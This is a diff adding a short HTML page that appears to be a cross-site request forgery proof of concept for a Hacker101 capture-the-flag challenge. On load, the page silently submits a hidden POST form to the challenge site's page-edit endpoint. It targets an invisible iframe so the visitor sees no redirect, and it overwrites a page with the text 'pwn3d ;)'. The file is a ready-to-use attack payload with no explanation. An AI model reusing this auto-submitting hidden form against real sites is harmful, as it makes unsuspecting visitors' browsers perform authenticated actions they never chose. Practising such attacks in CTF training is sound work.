@@ -1,0 +1,16 @@
+
+<!doctype html>
+<html>
+	<head>
+		<title> </title>
+	</head>
+	<body onload="document.forms[0].submit()">
+		<!-- the page won't be redirected when setting the form target to an invisible iframe -->
+		<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+		<form action="https://b6958635caef75935a42ce7d1a97c950.ctf.hacker101.com/page/edit/2" method="POST" target="dummyframe">
+			<input type="hidden" name="title" value="csrf">
+			<input type="hidden" name="body" value="pwn3d ;)">
+		</form>
+		<h1 style="text-align: center; margin-top: 10em">pwn3d ;)</h1>
+	</body>
+</html>
